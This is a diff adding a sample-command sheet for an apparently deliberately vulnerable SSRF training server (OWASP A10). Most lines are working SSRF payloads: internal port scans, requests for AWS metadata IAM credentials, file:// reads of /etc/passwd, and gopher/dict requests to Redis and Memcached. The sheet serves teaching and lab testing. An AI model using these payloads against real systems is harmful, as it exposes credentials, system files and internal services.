@@ -1,0 +1,41 @@
+A10 - Server-Side Request Forgery (SSRF) - Sample Curl Commands
+================================================================
+
+Server: python A10_Example_SSRF.py
+Port: 5001
+
+# Test basic URL fetching:
+curl http://localhost:5001/fetch?url=http://example.com
+curl http://localhost:5001/fetch?url=https://httpbin.org/ip
+
+# Test SSRF attacks (EDUCATIONAL PURPOSES ONLY):
+
+# Internal network scanning:
+curl http://localhost:5001/fetch?url=http://localhost:8080/admin
+curl http://localhost:5001/fetch?url=http://127.0.0.1:22
+curl http://localhost:5001/fetch?url=http://192.168.1.1
+curl http://localhost:5001/fetch?url=http://10.0.0.1
+
+# Cloud metadata access (AWS):
+curl http://localhost:5001/fetch?url=http://169.254.169.254/latest/meta-data/
+curl http://localhost:5001/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# File system access:
+curl http://localhost:5001/fetch?url=file:///etc/passwd
+curl http://localhost:5001/fetch?url=file:///etc/hosts
+curl http://localhost:5001/fetch?url=file:///proc/version
+
+# Test webhook endpoint:
+curl -X POST http://localhost:5001/webhook -H 'Content-Type: application/json' -d '{"url":"http://example.com"}'
+curl -X POST http://localhost:5001/webhook -H 'Content-Type: application/json' -d '{"url":"http://localhost:8080/internal"}'
+
+# Test proxy endpoint:
+curl http://localhost:5001/proxy?target=http://example.com
+curl http://localhost:5001/proxy?target=http://localhost:8080/admin
+
+# Protocol bypass attempts:
+curl http://localhost:5001/fetch?url=gopher://localhost:6379/_INFO
+curl http://localhost:5001/fetch?url=dict://localhost:11211/stat
+
+# Vulnerability: No URL validation, unrestricted outbound requests
+# Impact: Internal network access, cloud metadata exposure, file system access
